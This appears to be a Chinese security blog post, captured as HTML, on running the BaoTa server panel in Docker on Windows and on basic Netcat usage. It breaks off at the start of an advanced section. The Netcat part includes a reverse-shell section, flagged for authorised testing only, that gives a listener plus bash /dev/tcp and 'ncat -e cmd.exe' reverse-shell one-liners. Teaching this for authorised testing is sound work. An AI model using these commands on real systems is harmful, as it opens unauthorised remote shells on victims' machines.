@@ -1,0 +1,466 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>宝塔安装和Netcat使用 | 半生烟雨半生僧</title><meta name="author" content="老六"><meta name="copyright" content="老六"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Docker 环境 + 宝塔面板 以下是 Windows 系统安装 Docker 环境 + 宝塔面板的详细指南，包含容器化部署的注意事项和常见问题解决方案：  一、在 Windows 上安装 Docker 和 Docker Compose1. 安装 Docker Desktop 步骤：  下载 **Docker Desktop for Windows**。 双击安装包，勾选以下选项：  Use W">
+<meta property="og:type" content="article">
+<meta property="og:title" content="宝塔安装和Netcat使用">
+<meta property="og:url" content="http://blog.jjyyo.com/2025/05/12/wang-luo-an-quan/ji-zhu-jin-jie/1-shen-tou-ce-shi-liu-cheng-yu-biao-zhun/index.html">
+<meta property="og:site_name" content="半生烟雨半生僧">
+<meta property="og:description" content="Docker 环境 + 宝塔面板 以下是 Windows 系统安装 Docker 环境 + 宝塔面板的详细指南，包含容器化部署的注意事项和常见问题解决方案：  一、在 Windows 上安装 Docker 和 Docker Compose1. 安装 Docker Desktop 步骤：  下载 **Docker Desktop for Windows**。 双击安装包，勾选以下选项：  Use W">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://tvax3.sinaimg.cn/large/9bd9b167gy1g4lhomn16qj21hc0xcx0e.jpg">
+<meta property="article:published_time" content="2025-05-12T12:27:35.000Z">
+<meta property="article:modified_time" content="2025-05-12T16:15:47.849Z">
+<meta property="article:author" content="老六">
+<meta property="article:tag" content="网络安全-阶段法国">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://tvax3.sinaimg.cn/large/9bd9b167gy1g4lhomn16qj21hc0xcx0e.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "宝塔安装和Netcat使用",
+  "url": "http://blog.jjyyo.com/2025/05/12/wang-luo-an-quan/ji-zhu-jin-jie/1-shen-tou-ce-shi-liu-cheng-yu-biao-zhun/",
+  "image": "https://image.baidu.com/search/down?url=https://tvax3.sinaimg.cn/large/9bd9b167gy1g4lhomn16qj21hc0xcx0e.jpg",
+  "datePublished": "2025-05-12T12:27:35.000Z",
+  "dateModified": "2025-05-12T16:15:47.849Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "老六",
+      "url": "https://blog.jjyyo.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/blog.png"><link rel="canonical" href="http://blog.jjyyo.com/2025/05/12/wang-luo-an-quan/ji-zhu-jin-jie/1-shen-tou-ce-shi-liu-cheng-yu-biao-zhun/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-center"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '宝塔安装和Netcat使用',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/style.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://img.jjyyo.com/file/头像/1743607786443_头像2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://image.baidu.com/search/down?url=https://tvax3.sinaimg.cn/large/9bd9b167gy1g4lhomn16qj21hc0xcx0e.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">半生烟雨半生僧</span></a><a class="nav-page-title" href="/"><span class="site-name">宝塔安装和Netcat使用</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">宝塔安装和Netcat使用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-12T12:27:35.000Z" title="发表于 2025-05-12 20:27:35">2025-05-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-12T16:15:47.849Z" title="更新于 2025-05-13 00:15:47">2025-05-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%8A%80%E6%9C%AF%E8%BF%9B%E9%98%B6/">技术进阶</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2025/05/12/wang-luo-an-quan/ji-zhu-jin-jie/1-shen-tou-ce-shi-liu-cheng-yu-biao-zhun/#post-comment"><span class="gitalk-comment-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Docker-环境-宝塔面板"><a href="#Docker-环境-宝塔面板" class="headerlink" title="Docker 环境 + 宝塔面板"></a>Docker 环境 + 宝塔面板</h2><hr>
+<p>以下是 Windows 系统安装 <strong>Docker 环境 + 宝塔面板</strong>的详细指南，包含容器化部署的注意事项和常见问题解决方案：</p>
+<hr>
+<h3 id="一、在-Windows-上安装-Docker-和-Docker-Compose"><a href="#一、在-Windows-上安装-Docker-和-Docker-Compose" class="headerlink" title="一、在 Windows 上安装 Docker 和 Docker Compose"></a><strong>一、在 Windows 上安装 Docker 和 Docker Compose</strong></h3><h4 id="1-安装-Docker-Desktop"><a href="#1-安装-Docker-Desktop" class="headerlink" title="1. 安装 Docker Desktop"></a><strong>1. 安装 Docker Desktop</strong></h4><ul>
+<li><p><strong>步骤</strong>：</p>
+<ol>
+<li>下载 **<a target="_blank" rel="noopener" href="https://www.docker.com/products/docker-desktop/">Docker Desktop for Windows</a>**。</li>
+<li>双击安装包，勾选以下选项：<ul>
+<li><input checked="" disabled="" type="checkbox"> <strong>Use WSL 2 instead of Hyper-V</strong>（推荐，性能更好）</li>
+<li><input checked="" disabled="" type="checkbox"> 添加 Docker Compose 到系统环境变量。</li>
+</ul>
+</li>
+<li>安装完成后重启电脑。</li>
+</ol>
+</li>
+<li><p><strong>验证安装</strong>：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">--version</span>          <span class="comment"># 输出 Docker 版本</span></span><br><span class="line">docker<span class="literal">-compose</span> <span class="literal">--version</span>  <span class="comment"># 输出 Docker Compose 版本</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="2-配置-WSL-2-后端（必须）"><a href="#2-配置-WSL-2-后端（必须）" class="headerlink" title="2. 配置 WSL 2 后端（必须）"></a><strong>2. 配置 WSL 2 后端（必须）</strong></h4><ol>
+<li>启用 WSL：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:Microsoft<span class="literal">-Windows-Subsystem-Linux</span> /all /norestart</span><br><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure></li>
+<li>下载并安装 **<a target="_blank" rel="noopener" href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">WSL 2 内核更新包</a>**。</li>
+<li>设置默认 WSL 版本为 2：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl <span class="literal">--set-default-version</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<h3 id="二、通过-Docker-部署宝塔面板"><a href="#二、通过-Docker-部署宝塔面板" class="headerlink" title="二、通过 Docker 部署宝塔面板"></a><strong>二、通过 Docker 部署宝塔面板</strong></h3><h4 id="1-创建专用目录和配置文件"><a href="#1-创建专用目录和配置文件" class="headerlink" title="1. 创建专用目录和配置文件"></a><strong>1. 创建专用目录和配置文件</strong></h4><ul>
+<li>在 Windows 中新建文件夹（如 <code>C:\bt-panel</code>）。</li>
+<li>创建 <code>docker-compose.yml</code> 文件，内容如下：<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">bt-panel:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">baotaoserver/bt-panel:latest</span>  <span class="comment"># 官方社区镜像</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">bt-panel</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;8888:8888&quot;</span>           <span class="comment"># 面板端口</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;80:80&quot;</span>               <span class="comment"># HTTP</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;443:443&quot;</span>             <span class="comment"># HTTPS</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;20:20&quot;</span>               <span class="comment"># FTP</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;21:21&quot;</span>             </span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;3306:3306&quot;</span>           <span class="comment"># MySQL</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;6379:6379&quot;</span>           <span class="comment"># Redis</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./wwwroot:/www/wwwroot</span>  <span class="comment"># 网站数据</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./mysql_data:/www/server/data</span>  <span class="comment"># MySQL数据库</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./vhost:/www/server/panel/vhost</span>  <span class="comment"># Nginx配置</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">BT_PANEL_PORT=8888</span>   <span class="comment"># 设置面板端口</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span>         <span class="comment"># 容器需特权模式运行（部分功能依赖）</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="2-启动宝塔容器"><a href="#2-启动宝塔容器" class="headerlink" title="2. 启动宝塔容器"></a><strong>2. 启动宝塔容器</strong></h4><ul>
+<li>打开 PowerShell，进入项目目录：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\bt<span class="literal">-panel</span></span><br><span class="line">docker<span class="literal">-compose</span> up <span class="literal">-d</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="3-获取宝塔面板登录信息"><a href="#3-获取宝塔面板登录信息" class="headerlink" title="3. 获取宝塔面板登录信息"></a><strong>3. 获取宝塔面板登录信息</strong></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs bt<span class="literal">-panel</span> | <span class="built_in">Select-String</span> <span class="string">&quot;username|password&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>输出示例如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: ********</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="4-访问宝塔面板"><a href="#4-访问宝塔面板" class="headerlink" title="4. 访问宝塔面板"></a><strong>4. 访问宝塔面板</strong></h4><ul>
+<li>浏览器访问：<code>http://localhost:8888</code> 或 <code>http://你的Windows主机IP:8888</code>。</li>
+</ul>
+<hr>
+<h3 id="三、Windows-专属注意事项"><a href="#三、Windows-专属注意事项" class="headerlink" title="三、Windows 专属注意事项"></a><strong>三、Windows 专属注意事项</strong></h3><h4 id="1-文件路径问题"><a href="#1-文件路径问题" class="headerlink" title="1. 文件路径问题"></a><strong>1. 文件路径问题</strong></h4><ul>
+<li><strong>路径映射冲突</strong>：Windows 的 <code>C:\</code> 路径需转义为 <code>/c/</code> 格式。<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/c/bt-panel/wwwroot:/www/wwwroot</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="2-权限问题"><a href="#2-权限问题" class="headerlink" title="2. 权限问题"></a><strong>2. 权限问题</strong></h4><ul>
+<li><strong>共享驱动器设置</strong>（Docker Desktop）：<ol>
+<li>右键 Docker 托盘图标 → <strong>Settings → Resources → File Sharing</strong>。</li>
+<li>添加 <code>C:\bt-panel</code> 到允许列表。</li>
+</ol>
+</li>
+</ul>
+<h4 id="3-防火墙放行端口"><a href="#3-防火墙放行端口" class="headerlink" title="3. 防火墙放行端口"></a><strong>3. 防火墙放行端口</strong></h4><ul>
+<li><strong>Windows Defender 防火墙</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;BT-Panel Ports&quot;</span> <span class="literal">-Direction</span> Inbound <span class="literal">-LocalPort</span> <span class="number">8888</span>,<span class="number">80</span>,<span class="number">443</span> <span class="literal">-Protocol</span> TCP <span class="literal">-Action</span> Allow</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="四、宝塔面板兼容性问题"><a href="#四、宝塔面板兼容性问题" class="headerlink" title="四、宝塔面板兼容性问题"></a><strong>四、宝塔面板兼容性问题</strong></h3><h4 id="已知限制"><a href="#已知限制" class="headerlink" title="已知限制"></a><strong>已知限制</strong></h4><ul>
+<li><strong>功能异常</strong>：宝塔依赖 Linux 内核的模块（如 <code>iptables</code>），Windows 容器化部署可能导致：<ul>
+<li>网站防火墙失效</li>
+<li>计划任务（Cron）不工作</li>
+<li>部分插件兼容性差</li>
+</ul>
+</li>
+</ul>
+<h4 id="替代方案"><a href="#替代方案" class="headerlink" title="替代方案"></a><strong>替代方案</strong></h4><ul>
+<li><strong>虚拟机运行</strong>：在 Windows 上通过 <a target="_blank" rel="noopener" href="https://www.vmware.com/">VMware</a> 或 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/virtualization/hyper-v/hyper-v-technology-overview">Hyper-V</a> 安装 Linux 虚拟机，再部署宝塔面板。</li>
+</ul>
+<hr>
+<h3 id="五、常用命令汇总"><a href="#五、常用命令汇总" class="headerlink" title="五、常用命令汇总"></a><strong>五、常用命令汇总</strong></h3><table>
+<thead>
+<tr>
+<th>操作</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>启动容器</td>
+<td><code>docker-compose up -d</code></td>
+</tr>
+<tr>
+<td>停止容器</td>
+<td><code>docker-compose down</code></td>
+</tr>
+<tr>
+<td>查看容器日志</td>
+<td><code>docker logs -f bt-panel</code></td>
+</tr>
+<tr>
+<td>进入容器Shell</td>
+<td><code>docker exec -it bt-panel bash</code></td>
+</tr>
+<tr>
+<td>重置宝塔密码</td>
+<td><code>docker exec bt-panel bt 5</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="六、卸载与清理"><a href="#六、卸载与清理" class="headerlink" title="六、卸载与清理"></a><strong>六、卸载与清理</strong></h3><ol>
+<li><strong>删除容器和数据</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker<span class="literal">-compose</span> down <span class="literal">-v</span>  <span class="comment"># 删除容器和挂载卷</span></span><br></pre></td></tr></table></figure></li>
+<li>手动删除目录 <code>C:\bt-panel</code>。</li>
+</ol>
+<hr>
+<p>如果需要长期稳定使用，建议切换到 Linux 系统！ 🐧</p>
+<h2 id="Netcat使用"><a href="#Netcat使用" class="headerlink" title="Netcat使用"></a>Netcat使用</h2><hr>
+<p><strong>Netcat（NC）</strong> 是一个功能强大的网络工具，被称为“网络瑞士军刀”，支持 <strong>TCP&#x2F;UDP</strong> 协议，可用于端口扫描、文件传输、远程连接甚至渗透测试。以下是具体用法和常见场景：</p>
+<hr>
+<h3 id="一、安装Netcat"><a href="#一、安装Netcat" class="headerlink" title="一、安装Netcat"></a><strong>一、安装Netcat</strong></h3><h4 id="1-不同系统的安装方法："><a href="#1-不同系统的安装方法：" class="headerlink" title="1. 不同系统的安装方法："></a><strong>1. 不同系统的安装方法：</strong></h4><ul>
+<li><strong>Linux</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install netcat-openbsd   <span class="comment"># Debian/Ubuntu</span></span><br><span class="line"><span class="built_in">sudo</span> yum install nc               <span class="comment"># CentOS/RHEL</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>Windows</strong>：<ul>
+<li>下载 **<a target="_blank" rel="noopener" href="https://nmap.org/download.html">nmap</a>**，内置 <code>ncat</code>（增强版Netcat）。</li>
+<li>或单独下载 **<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">Netcat for Windows</a>**，解压后添加环境变量。</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-版本区别："><a href="#2-版本区别：" class="headerlink" title="2. 版本区别："></a><strong>2. 版本区别</strong>：</h4><ul>
+<li><code>nc</code>：传统版本，功能基础。</li>
+<li><code>ncat</code>（来自nmap）：支持 SSL、代理链、多线程，建议优先使用。</li>
+</ul>
+<hr>
+<h3 id="二、基础用法与场景"><a href="#二、基础用法与场景" class="headerlink" title="二、基础用法与场景"></a><strong>二、基础用法与场景</strong></h3><h4 id="1-端口扫描（替代Telnet）"><a href="#1-端口扫描（替代Telnet）" class="headerlink" title="1. 端口扫描（替代Telnet）"></a><strong>1. 端口扫描（替代Telnet）</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -zv 192.168.1.100 1-1000       <span class="comment"># 扫描1-1000端口是否开放（-z: 零数据传输）</span></span><br><span class="line">nc -zv example.com 80             <span class="comment"># 检查目标80端口能否连通</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-简单聊天室（TCP）"><a href="#2-简单聊天室（TCP）" class="headerlink" title="2. 简单聊天室（TCP）"></a><strong>2. 简单聊天室（TCP）</strong></h4><ul>
+<li><strong>服务端（监听端口）</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234                   <span class="comment"># -l: 监听模式 -v: 详细信息 -n: 禁用DNS -p: 端口</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>客户端（连接服务端）</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.100 1234</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="3-文件传输"><a href="#3-文件传输" class="headerlink" title="3. 文件传输"></a><strong>3. 文件传输</strong></h4><ul>
+<li><strong>发送文件（服务端→客户端）</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接收方（服务端）</span></span><br><span class="line">nc -lvnp 1234 &gt; received_file.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送方（客户端）</span></span><br><span class="line">nc 192.168.1.100 1234 &lt; send_file.zip</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="4-反向Shell（高危操作，仅用于授权测试）"><a href="#4-反向Shell（高危操作，仅用于授权测试）" class="headerlink" title="4. 反向Shell（高危操作，仅用于授权测试）"></a><strong>4. 反向Shell（高危操作，仅用于授权测试）</strong></h4><ul>
+<li><strong>攻击机监听</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444                   <span class="comment"># 监听4444端口</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>目标机连接（Linux）</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.1.100/4444 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>目标机连接（Windows）</strong>：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat.exe <span class="number">192.168</span>.<span class="number">1.100</span> <span class="number">4444</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="三、进阶技巧（Ncat）"><a href="#三、进阶技巧（Ncat）" class="headerlink" title="三、进阶技巧（Ncat）"></a><strong>三、进阶技巧（Ncat）</strong></h3><h4 id="1-加密通信（SSL）"><a href="#1-加密通信（SSL）" class="headerlink" title="1. 加密通信（SSL）"></a><strong>1. 加密通信（SSL）</strong></h4><ul>
